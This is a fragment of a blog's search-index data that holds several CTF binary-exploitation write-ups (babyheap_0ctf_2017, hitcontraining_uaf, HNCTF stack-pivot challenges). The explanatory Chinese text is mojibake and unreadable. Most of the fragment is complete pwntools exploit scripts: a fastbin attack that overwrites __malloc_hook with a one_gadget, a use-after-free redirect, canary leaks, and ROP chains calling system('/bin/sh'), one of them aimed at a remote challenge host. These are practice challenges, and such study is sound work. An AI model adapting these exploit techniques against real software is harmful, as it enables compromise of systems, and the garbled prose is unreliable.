åŸç†æ˜¯åœ¨è°ƒç”¨mallocæˆ–è€…freeçš„æ—¶å€™ï¼Œå¦‚æœ malloc_hook å’Œfree_hookçš„å€¼å­˜åœ¨ï¼Œåˆ™ä¼šè°ƒç”¨malloc_hookæˆ–è€…free_hookæŒ‡å‘çš„åœ°å€ï¼Œå‡è®¾åœ¨ä½¿ç”¨one_gadgetçš„æ—¶å€™æ»¡è¶³one_gadgetçš„è°ƒç”¨æ¡ä»¶ï¼Œå½“overwrite malloc_hookå’Œfree_hookçš„æ—¶å€™ï¼Œä¾¿å¯ä»¥getshellï¼Œæ‰§è¡Œmallocçš„æ—¶å€™ï¼Œå…¶å‚æ•°æ˜¯sizeå¤§å°ï¼Œæ‰€ä»¥overwrite malloc_hookçš„æ—¶å€™ä½¿ç”¨one_gadgetçš„åœ°å€å¯ä»¥getshellã€‚æ‰§è¡Œfreeçš„æ—¶å€™ï¼Œå¯ä»¥å°†__free_hookçš„å€¼overwriteä¸ºsystemçš„åœ°å€ï¼Œé€šè¿‡é‡Šæ”¾(/bin/sh\x00)çš„chunkï¼Œå¯ä»¥è¾¾åˆ°system(/bin/sh)æ¥getshell&lt;br&gt;
æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€å—malloc_hooké™„è¿‘çš„fake_chunkï¼Œä½¿å…¶è¿›å…¥fast binï¼Œå†å°†å…¶ç”³è¯·å‡ºæ¥ï¼Œé€šè¿‡fill()å¯ä»¥å°†malloc_hookä¿®æ”¹ä¸ºone_gadget&lt;br&gt;
æœ€åä»chunk 4ï¼ˆunsorted binä¸­ï¼‰ç”³è¯·ä¸€å—fast chunkå‡ºæ¥ï¼Œfreeæ‰è¿›å…¥fast binï¼Œç„¶åé€šè¿‡ä¿®æ”¹chunk 2å¯ä»¥ä¿®æ”¹chunk 4çš„fdåˆ°fake_chunkï¼Œæœ€ååˆ†é…fake_chunkï¼Œfill(6) å³chunk 6æ¥getshell&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./babyheap_0ctf_2017&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26939)
elf=ELF(&amp;quot;./babyheap_0ctf_2017&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
main_arena_off=0x3C4B20
fake_chunk_off=0x3c4aed

def alloc(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recvuntil(b&amp;quot;Size: &amp;quot;)
    io.sendline(str(n))

def fill(n,s,m):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Size: &amp;quot;)
    io.sendline(str(s))
    io.recvuntil(b&amp;quot;Content: &amp;quot;)
    io.send(m)

def free(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))

def dump(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Content: \n&amp;quot;)


alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)

free(1)
free(2)

payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)+b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)+p8(0x80)
fill(0,len(payload),payload)


payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)
fill(3,len(payload),payload)


alloc(0x10)  #allocate chunk2
alloc(0x10) #allocate chunk4

payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x91)
fill(3,len(payload),payload)

alloc(0x80)
free(4)

gdb.attach(io)
pause()

dump(2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
libc_addr=leak_addr-main_arena_off-0x58
fake_chunk=libc_addr+fake_chunk_off
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=one_gadget[1]+libc_addr
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
print(&amp;quot;fake_chunk:  &amp;quot;+hex(fake_chunk))
print(&amp;quot;malloc_hook:  &amp;quot;+hex(malloc_hook))
print(&amp;quot;shell:  &amp;quot;+hex(shell))





alloc(0x60) #fast chunk
free(4) #into fast bin
payload=p64(fake_chunk)
fill(2,len(payload),payload)


alloc(0x60) #chunk 4
alloc(0x60) #chunk 6
payload=cyclic(0x13)+p64(shell)
fill(6,len(payload),payload)
alloc(0x100)

io.interactive()


# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">babyheap_0ctf_2017 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xKSRkZlGH/"" data-c="
          &lt;p&gt;ä¸€é“32ä½å †é¢˜ï¼Œå¼€å¯nxä¿æŠ¤ï¼ŒfreeåæŒ‡é’ˆæœªç½®nullå­˜åœ¨uafæ¼æ´&lt;br&gt;
idaä¸»å‡½æ•°&lt;img src=&#34;https://oraclepi.tech/post-images/1679384000551.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
menuä¸­å¯ä»¥çœ‹å‡ºå­˜åœ¨add_noteï¼Œdel_noteï¼Œprintf_noteä¸‰ä¸ªä¸»è¦å‡½æ•°&lt;br&gt;
è¿›å…¥åˆ°add_noteé‡Œé¢å¯ä»¥å‘ç°æ¯æ¬¡addæ—¶ç»™äºŒç»´æŒ‡é’ˆæ•°ç»„noteliståˆ†é…äº†8bytesç©ºé—´&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384185720.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
print_noteå¯ä»¥æ‰§è¡Œ*(notelist[v2])(notelist[v2])å¤„çš„å‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384273443.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œé€ æˆæ¼æ´çš„del_noteå‡½æ•°ä¸­free&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384215187.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œnotelistçš„å‰å››ä¸ªå­—èŠ‚ç»´æŠ¤é¦–åœ°å€ï¼Œåå››ä¸ªå­—èŠ‚ç»´æŠ¤å†…å®¹&lt;br&gt;
äºæ˜¯æˆ‘ä»¬å…ˆadd_noteä¸¤æ¬¡ï¼Œå†ä¾æ¬¡del_noteä¹‹åï¼Œæœ€åä¸€æ¬¡add_noteæ—¶å°†sizeè®¾ä¸º8ä¿è¯best fitåŸåˆ™åˆ†é…åˆ°æœ€åˆfreeçš„chunkä¸­ï¼Œæœ€åprint_noteè·å–shell&lt;br&gt;
gdbè°ƒè¯•å‘ç°æœ€åcall eaxæ—¶æ‰§è¡Œ0x9f451a0å¤„å¡«å……çš„åœ°å€æŒ‡å‘çš„å‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679386515982.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./hacknote&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25546)
back_door=0x8048945

def add(n,st):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recvuntil(b&amp;quot;size :&amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Content :&amp;quot;)
    io.send(st)

def delete(n):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;Index :&amp;quot;)
    io.sendline(str(n))

def printw(n):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;Index :&amp;quot;)
    io.sendline(str(n))

add(24,cyclic(0x18))
add(24,cyclic(0x18))
delete(0)
delete(1)
gdb.attach(io)
pause()
add(8,p32(back_door))
printw(0)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">hitcontraining_uaf wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/M53rCmTPP/"" data-c="
          &lt;p&gt;64ä½å¼€å¯nxä¿æŠ¤çš„æ ˆè¿ç§»é¢˜ç›®&lt;br&gt;
idaä¸»å‡½æ•°ï¼Œå¯ä»¥çœ‹å‡ºåªæœ‰ä¸€æ¬¡æº¢å‡º&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679066891201.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬ä¸€æ¬¡è¿ç§»æ ˆåˆ°bssæ®µä¸Šï¼Œè°ƒç”¨readè¿›è¡Œå¸ƒæ ˆæ“ä½œï¼Œæ³„éœ²libcåŸºå€ï¼Œæ³¨æ„è¾“å…¥è·ç¦»rbpä¸º0x60ï¼Œæ¯æ¬¡è¿ç§»éƒ½éœ€è¦è€ƒè™‘åç§»&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0x60)+p64(leave_ret)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¬¬äºŒæ¬¡è¿ç§»æ„é€ è·å–shellï¼Œä¹Ÿå¯ä»¥ä¸è¿ç§»ç›´æ¥æ‰“one_gadget&lt;br&gt;
è¿ç§»æ³¨æ„åç§»é‡ï¼Œè¿™é‡Œ&lt;code&gt;-0xa8&lt;/code&gt;æˆ‘æ˜¯gdbæ‰‹è°ƒå‡ºæ¥çš„ï¼ŒğŸ¥¹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0xa8)+p64(leave_ret)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®Œæ•´expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./pwn1&amp;quot;)
# io=remote(&amp;quot;1.13.251.106&amp;quot;,8005)
elf=ELF(&amp;quot;./pwn1&amp;quot;)
libc=ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
bss_addr=0x404040+0x700
pop_rdi_ret=0x401283
leave_ret=0x401214
read_text=0x4011FD
main=0x4011db

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=cyclic(0x60)+p64(bss_addr)+p64(read_text)
io.send(payload)

payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0x60)+p64(leave_ret)

io.send(payload)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0xa8)+p64(leave_ret)
io.sendline(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401214 : leave ; ret
# 0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401280 : pop r14 ; pop r15 ; ret
# 0x0000000000401282 : pop r15 ; ret
# 0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x0000000000401283 : pop rdi ; ret
# 0x0000000000401281 : pop rsi ; pop r15 ; ret
# 0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">åªæœ‰ä¸€æ¬¡æº¢å‡ºçš„æ ˆè¿ç§»ç»ƒä¹ </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/oDp60mSoN/"" data-c="
          &lt;p&gt;åˆä¸€é“æ ˆè¿ç§»ï¼Œ64ä½å¼€å¯canaryå’Œnxä¿æŠ¤ï¼Œ&lt;br&gt;
idaæŸ¥çœ‹å…±æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œéƒ½éœ€è¦éªŒè¯canary&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678940554319.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678940558887.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œç¬¬äºŒæ¬¡æº¢å‡ºé•¿åº¦ä¸å¤Ÿï¼Œè€ƒè™‘æ ˆè¿ç§»&lt;br&gt;
äºæ˜¯ç¬¬ä¸€æ¬¡æº¢å‡ºæ³„éœ²canaryï¼Œç¬¬äºŒæ¬¡è¿›è¡Œæ ˆè¿ç§»ï¼Œå†åˆ°è¿ç§»åˆ°çš„bssæ®µä¸Šè¿›è¡Œå¸ƒæ ˆæ“ä½œæ³„éœ²libcï¼Œæœ€åå†&lt;s&gt;è¿”å›ä¸»å‡½æ•°ä½¿ç”¨one_gadget&lt;/s&gt;&lt;br&gt;
æ³„éœ²canaryä¹‹åçš„ç¬¬ä¸€æ®µpayloadï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text) #read_textä¸ºç¬¬äºŒæ¬¡read 
io.send(payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨ä¸€æ¬¡leaveæ§åˆ¶rbpå¯„å­˜å™¨åˆ°bss_addrå¤„ï¼Œå†è¿›è¡Œreadï¼Œä»è·ç¦»rbp-0x110å¤„å¼€å§‹å¸ƒæ ˆï¼Œæ³¨æ„å°†rbp(ä¹Ÿå°±æ˜¯bss_addrå¤„ï¼‰è¦†ç›–ä¸ºbss_addr-0x110ï¼Œå°†rbp+0x8ï¼ˆä¹Ÿå°±æ˜¯bss_addr+0x8)å¤„è¦†ç›–ä¸ºleave_retï¼Œå®Œæˆåç¬¬äºŒæ¬¡leaveåŠ«æŒrspåˆ°bss_addr+0x8å¤„ï¼ŒåŒæ—¶å°†rbpæŒ‡å‘bss_addr-0x110å¤„ï¼Œç„¶åç¬¬ä¸‰æ¬¡leave_retå…ˆåŠ«æŒrspåˆ°bss_addr-0x110å¤„ï¼Œç„¶åpop rbpå¯¼è‡´rsp+0x8ï¼Œæœ€åretæ‰§è¡Œåç»­æŒ‡ä»¤ï¼Œäºæ˜¯åˆ©ç”¨ç¬¬äºŒæ®µpayloadæ³„éœ²libcï¼Œæ³¨æ„æ ˆç©ºé—´è®¡ç®—ï¼Œè¿™é‡Œä½¿ç”¨äº†ljustå·¦å¯¹é½ï¼Œä¹‹å‰æ‰‹ç®—çš„åç§»å¯¼è‡´canaryéªŒè¯å‡ºé”™ğŸ˜¶â€ğŸŒ«ï¸&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.sendline(payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦å¤–æ³¨æ„æœ€åè¿”å›çš„æ˜¯vulnå‡½æ•°ä¸æ˜¯mainå‡½æ•°ï¼Œä¸€å¼€å§‹è¿”å›mainç”¨gdbæ­¥è¿›åˆ°printfå‡ºé—®é¢˜ï¼Œï¼ˆmainå‡½æ•°ä¸­setbufåç¼“å†²åŒºè®¾0ï¼Œå¯¼è‡´printfæ—¶ä¼šæœ‰ä¸€ä¸ªåœ¨æ ˆä¸Šåˆ›å»ºä¸€å¨ç›¸å…³æ•°æ®ç»“æ„çš„æ“ä½œï¼Œå°±ç®—æ­£å¸¸è·‘ä¹Ÿè¦åƒæ‰å¤§é‡æ ˆï¼Œæ‰€ä»¥ä¼šè·‘ç€è·‘ç€æ ˆä¸å¤Ÿäº†ï¼Œå†™åˆ°ä¸è¯¥å†™çš„åœ°æ–¹äº†ã€‚ï¼‰--å­¦é•¿åŸè¯æ‘˜æŠ„&lt;br&gt;
æœ€åæ­¤é¢˜one_gadgetåªæœ‰ä¸€ä¸ªèƒ½åœ¨æœ¬åœ°è°ƒè¯•æ¨¡å¼ä¸‹æ‰“é€šï¼Œè¿œç«¯é€šä¸äº†ï¼›&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678942093537.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿˜æ˜¯æ”¾ä¸‹ä¸å®Œæ•´çš„expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pivot&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28559)
elf=ELF(&amp;quot;./pivot&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
one_gadget=[0x50a37,0xebcf1,0xebcf5,0xebcf8,0xebd52,0xebdaf,0xebdb3]
pop_rdi_ret=0x401343
bss_addr=0x404080+0x500
leave_ret=0x401213
read_text=0x4011D4
vuln=0x4011b6

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28

gdb.attach(io)
pause()

io.sendline(payload)
io.recvuntil(b&amp;quot;a\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text)
io.send(payload)

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.sendline(payload)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

# sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
# str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

shell=one_gadget[0]+base_addr
print(&amp;quot;shell:  &amp;quot;+hex(shell))
payload=cyclic(0x107)+p64(canary)+p64(0)+p64(shell)
io.send(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401213 : leave ; ret
# 0x0000000000401196 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
# 0x00000000004012d3 : mov ecx, 0xc9fffffd ; ret
# 0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401340 : pop r14 ; pop r15 ; ret
# 0x0000000000401342 : pop r15 ; ret
# 0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401343 : pop rdi ; ret
# 0x0000000000401341 : pop rsi ; pop r15 ; ret
# 0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;br&gt;
æ›´æ–°:&lt;br&gt;
æœ¬é¢˜ä¸ç”¨one_gadgetå°±åœ¨æœ€åä¸€æ¬¡æº¢å‡ºå¤„å†è¿ç§»ä¸€æ¬¡æ ˆåˆ©ç”¨æ„é€ ä¹Ÿè¡Œ,æ³¨æ„gdbè°ƒè¯•åç§»é‡,&lt;s&gt;æˆ‘ä¸ä¼šç®—åªæœ‰ä¸€æ¬¡æ¬¡è¯•&lt;/s&gt;&lt;br&gt;
æ›´æ–°åexpå¯é€šè¿œç«¯:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pivot&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28442)
elf=ELF(&amp;quot;./pivot&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
one_gadget=[0x50a37,0xebcf1,0xebcf5,0xebcf8,0xebd52,0xebdaf,0xebdb3]
pop_rdi_ret=0x401343
bss_addr=0x404080+0x900 #åç§»å¡äº†æˆ‘3å¤©,xå­¦é•¿æŒ‡ç‚¹é€šäº†
leave_ret=0x401213
read_text=0x4011D4
vuln=0x4011b6

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28

# gdb.attach(io)
# pause()

io.sendline(payload)
io.recvuntil(b&amp;quot;a\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text)
io.send(payload)

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.send(payload)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

shell=one_gadget[1]+base_addr
print(&amp;quot;sys_addr:  &amp;quot;+hex(sys_addr))
print(&amp;quot;str_bin_sh:  &amp;quot;+hex(str_bin_sh))

payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x208)+p64(leave_ret)  #0x208åç§»ä»0x220å¼€å§‹æ‰‹è°ƒğŸ˜ğŸ‘“ğŸ¥¹
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401213 : leave ; ret
# 0x0000000000401196 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
# 0x00000000004012d3 : mov ecx, 0xc9fffffd ; ret
# 0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401340 : pop r14 ; pop r15 ; ret
# 0x0000000000401342 : pop r15 ; ret
# 0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401343 : pop rdi ; ret
# 0x0000000000401341 : pop rsi ; pop r15 ; ret
# 0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]pivot wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/RpGkEvpwv/"" data-c="
          &lt;p&gt;è¿™é“é¢˜è€ƒå¯ŸUAFå’Œç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åæ‹¿shellè€—è´¹æ—¶é—´æ¯”æ„é€ UAFæ—¶é—´é•¿ï¼›&lt;br&gt;
å­˜åœ¨system()å‡½æ•°ï¼Œä½†éœ€è¦è‡ªå·±ä¼ å‚&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678522527943.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æœ¬é¢˜å­˜åœ¨4ä¸ªå‡½æ•°ï¼Œå…¶ä¸­createå‡½æ•°æ¯æ¬¡å¼€è¾Ÿä¸€ä¸ªä¸‹æ ‡é€’å¢çš„pageï¼Œeditå‡½æ•°å¯ä»¥ä¿®æ”¹æŒ‡å®špageï¼Œdelå‡½æ•°åˆ é™¤æŒ‡å®špageï¼Œä½†freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®NULLï¼Œå­˜åœ¨UAFï¼›&lt;br&gt;
è€Œshowå‡½æ•°åˆ™æ˜¯æœ¬é¢˜å…³é”®&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678522658853.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å½“è¾“å…¥ä¸ºé0æ—¶ï¼Œå±•ç¤ºè¾“å…¥æŒ‡å‘çš„pageï¼Œè€Œå½“è¾“å…¥ä¸º0æ—¶ï¼Œåˆ™æ‰§è¡Œpage0å¤„æŒ‡ä»¤&lt;br&gt;
æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆcreate 1æ¬¡ç”Ÿæˆpage0ï¼Œdelåå†create 1æ¬¡ç”Ÿæˆpage1ï¼Œä½†æ­¤æ—¶page1ä½¿ç”¨çš„ä»ç„¶æ—¶page0çš„å †ç©ºé—´ï¼Œæ‰€ä»¥edit page1æ—¶ç­‰æ•ˆäºedit page0ï¼Œæœ€åshow(0)å³å¯ï¼›&lt;br&gt;
ä¸è¿‡æœ€åæ‹¿shellçš„è·¯ç¨‹è¿˜çœŸæ˜¯ç»•ï¼Œæ­¤é¢˜å­˜åœ¨&lt;code&gt;NICO&lt;/code&gt;å‡½æ•°å¯ä»¥è°ƒç”¨&lt;code&gt;system(command)&lt;/code&gt;ï¼Œ&lt;br&gt;
